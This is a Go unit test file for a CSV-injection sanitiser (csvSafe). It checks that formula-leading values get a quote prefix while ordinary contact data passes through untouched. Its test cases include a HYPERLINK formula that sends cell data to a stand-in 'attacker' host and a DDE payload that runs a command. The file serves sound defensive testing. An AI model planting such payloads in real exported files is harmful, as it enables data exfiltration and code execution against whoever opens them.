package controllers

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestCsvSafe(t *testing.T) {
	tests := []struct {
		name  string
		value string
		want  string
	}{
		// Payloads that execute on open in Excel/LibreOffice.
		{"equals formula", `=1+1`, `'=1+1`},
		{"hyperlink exfiltration", `=HYPERLINK("http://attacker/?d="&A1,"click")`, `'=HYPERLINK("http://attacker/?d="&A1,"click")`},
		{"legacy DDE", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
		{"plus", `+1+1`, `'+1+1`},
		{"minus", `-1+1`, `'-1+1`},
		{"at sign", `@SUM(A1)`, `'@SUM(A1)`},
		{"leading tab", "\t=1+1", "'\t=1+1"},
		{"leading carriage return", "\r=1+1", "'\r=1+1"},

		// Ordinary contact data must pass through untouched.
		{"empty", "", ""},
		{"plain name", "Ada Lovelace", "Ada Lovelace"},
		{"email", "ada@example.com", "ada@example.com"},
		{"phone with plus not leading", "tel +44 20 7123", "tel +44 20 7123"},
		{"equals not leading", "a=b", "a=b"},
		{"comma", "Lovelace, Ada", "Lovelace, Ada"},
		{"unicode", "Ada Lovelace 💡", "Ada Lovelace 💡"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, csvSafe(tt.value))
		})
	}
}

// International phone numbers legitimately start with "+", so they get the
// text marker too. That is the accepted trade-off: a leading "+" is
// indistinguishable from a formula to a spreadsheet, and mangling the display
// slightly beats executing the value.
func TestCsvSafeLeadingPlusPhoneNumber(t *testing.T) {
	assert.Equal(t, "'+442071234567", csvSafe("+442071234567"))
}

func TestCsvSafeRecord(t *testing.T) {
	record := []string{"Ada", "=1+1", "ada@example.com", "@SUM(A1)"}
	assert.Equal(t,
		[]string{"Ada", "'=1+1", "ada@example.com", "'@SUM(A1)"},
		csvSafeRecord(record),
	)
}
